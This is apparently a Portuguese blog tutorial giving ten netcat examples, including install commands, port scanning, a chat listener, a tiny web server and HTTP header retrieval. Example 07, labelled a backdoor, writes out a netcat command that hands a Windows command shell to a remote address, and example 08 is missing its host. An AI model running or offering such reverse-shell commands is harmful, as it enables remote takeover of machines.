---
layout: post
title: "10 Exemplos do Comando Netcat (nc)"
date: 2021-04-12 13:41:43
image: '/assets/img/comandos/netcat.jpg'
description: 'Uma ferramente de comando de rede, simples e poderosa!'
icon: 'ion:terminal-sharp'
iconname: 'netcat'
tags:
- redes
- webhacker
---

![10 Exemplos do Comando Netcat (nc)](/assets/img/comandos/netcat.jpg)

O [Netcat](https://nc110.sourceforge.io/) é uma ferramenta de rede, disponível para sistemas operacionais [Unix](https://terminalroot.com.br/tags#unix), [Linux](https://terminalroot.com.br/tags#linux), [Microsoft Windows](https://terminalroot.com.br/tags#windows) e [Macintosh](https://terminalroot.com.br/tags#windows) que permite, por intermédio de comandos e com sintaxe muito sensível, abrir portas [TCP/UDP](https://terminalroot.com.br/tags#redes) e HOST. Permite forçar conexões UDP/TCP (útil para realizar rastreamento de portas ou realizar transferências de arquivos bit a bit entequipamentos). 

# Instalação
Para [Gentoo](https://terminalroot.com.br/tags#gentoo)/[Funtoo](https://terminalroot.com.br/tags#funtoo) basta rodar o comando:
{% highlight bash %}
sudo emerge --ask net-analyzer/netcat
{% endhighlight %}
> Alternativamente você pode usar a versão do [OpenBSD](https://terminalroot.com.br/tags#openbsd):

{% highlight bash %}
sudo emerge --ask net-analyzer/openbsd-netcat
{% endhighlight %}

<!-- QUADRADO -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
style="display:inline-block;width:336px;height:280px"
data-ad-client="ca-pub-2838251107855362"
data-ad-slot="5351066970"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>


Para sistemas baseados em *APT* [Debian](https://terminalroot.com.br/tags#debia), [Ubuntu](https://terminalroot.com.br/tags#ubuntu), [Linux Mint](https://terminalroot.com.br/tags#mint) e derivados, basta rodar:
{% highlight bash %}
sudo apt install netcat
{% endhighlight %}

E entre outras distros:
{% highlight bash %}
sudo dnf install nc # Fedora, RHEL, ..
sudo pacman -S netcat # Arch, Manjaro, ...
{% endhighlight %}

# Exemplos de uso

### 01. Verificar se uma porta está aberta
> Nesse caso a porta **80**

{% highlight bash %}
nc -z -v 192.168.1.1 80

# Exemplo de saída:
192.168.1.1: inverse host lookup failed: 
(UNKNOWN) [192.168.1.1] 80 (http) open
{% endhighlight %}

---

### 02. Verificando se uma range de portas estão abertas
> Nesse caso da porta 20 à 80

{% highlight bash %}
nc -z -v 10.10.8.8 20-80

# Exemplo de saída
nc: connect to 10.10.8.8 port 20 (tcp) failed: Connection refused
nc: connect to 10.10.8.8 port 21 (tcp) failed: Connection refused
Connection to 10.10.8.8 22 port [tcp/ssh] succeeded!
nc: connect to 10.10.8.8 port 23 (tcp) failed: Connection refused
...
nc: connect to 10.10.8.8 port 79 (tcp) failed: Connection refused
Connection to 10.10.8.8 80 port [tcp/http] succeeded!
{% endhighlight %}

---

### 03. Enviando um chat em uma determinada porta
{% highlight bash %}
nc -l -vv 192.168.1.105 -p 5000

192.168.1.105: inverse host lookup failed: 
listening on [any] 5000 ...
Iniciando um chat
Está funcionando ...
^C sent 0, rcvd 0

{% endhighlight %}

<!-- RETANGULO LARGO 2 -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
style="display:block; text-align:center;"
data-ad-layout="in-article"
data-ad-format="fluid"
data-ad-client="ca-pub-2838251107855362"
data-ad-slot="8549252987"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>


---

### 04. Criando um básico servidor web
+ Crie uma página web exemplo
{% highlight bash %}
echo '<h1>Servidor funfando de boa na porta 8080</h1>' >> index.html
{% endhighlight %}

+ Loop para o netcat
{% highlight bash %}
 while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done
{% endhighlight %}

Acesse: <http://localhost:8080>, irá aparecer sua página e após acessar o endereço a saída será enviada ao prompt:
{% highlight bash %}
GET / HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
{% endhighlight %}
> Derrube a conexão teclando: **Ctrl + Z** e em seguida mate o processo somente resetando o terminal: `reset`.

---

### 05. Criando um socket
{% highlight bash %}
nc -l /var/tmp/socket &
{% endhighlight %}

---

### 06. Obtendo cabeçalho de conexão de um endereço
{% highlight bash %}
printf "GET / HTTP/1.0\r\n\r\n" | nc google.com 80 | head -n 14
{% endhighlight %}

Saída:
{% highlight bash %}
HTTP/1.0 200 OK
Date: Mon, 12 Apr 2021 17:40:46 GMT
Expires: -1
Cache-Control: private, max-age=0
Content-Type: text/html; charset=ISO-8859-1
P3P: CP="This is not a P3P policy! See g.co/p3phelp for more info."
Server: gws
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Set-Cookie: 1P_JAR=2021-04-12-17; expires=Wed, 12-May-2021 17:40:46 GMT; path=/; domain=.google.com; Secure
Set-Cookie: NID=213=l9jwYfBM; expires=Tue, 12-Oct-2021 17:40:46 GMT; path=/; domain=.google.com; HttpOnly
Accept-Ranges: none
Vary: Accept-Encoding
{% endhighlight %}

---

### 07. Criando um backdoor
{% highlight bash %}
nc 192.168.1.199 3000 -e cmd.exe
{% endhighlight %}

---

<!-- MINI ANÚNCIO -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Games Root -->
<ins class="adsbygoogle"
style="display:inline-block;width:730px;height:95px"
data-ad-client="ca-pub-2838251107855362"
data-ad-slot="5351066970"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>


### 08. Rodando um script
{% highlight bash %}
nc  8080 -c script.sh
{% endhighlight %}

---

### 09. Obtendo ajuda
{% highlight bash %}
nc -h

[v1.10]
connect to somewhere:	nc [-options] hostname port[s] [ports] ...
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-4			Use IPv4 (default)
	-6			Use IPv6
	-b			allow broadcasts
	-g gateway		source-routing hop point[s], up to 8
	-G num			source-routing pointer: 4, 8, 12, ...
	-h			this cruft
	-i secs			delay interval for lines sent, ports scanned
	-l			listen mode, for inbound connects
	-n			numeric-only IP addresses, no DNS
	-o file			hex dump of traffic
	-p port			local port number
	-q secs			quit after EOF on stdin and delay of secs
	-r			randomize local and remote ports
	-s addr			local source address
	-t			answer TELNET negotiation
	-u			UDP mode
	-v			verbose [use twice to be more verbose]
	-w secs			timeout for connects and final net reads
	-z			zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive]
{% endhighlight %}

---

### 10. Lendo o manual
{% highlight bash %}
man nc

netcat is a simple unix utility which reads and        /\_/\
writes data across network connections, using TCP     / 0 0 \
or UDP protocol. It is designed to be a reliable     ====v====
"back-end" tool that can be used directly or easily   \  W  /
driven by other programs and scripts.  At the same    |     |     _
time, it is a feature-rich network debugging and      / ___ \    /
exploration tool, since it can create almost any     / /   \ \  |
kind of connection you would need and has several   (((-----)))-'
interesting built-in capabilities.  Netcat, or "nc"  /
as the actual program is named, should have been    (      ___
supplied long ago as another one of those cryptic    \__.=|___E
but standard Unix tools.                                     /

{% endhighlight %}


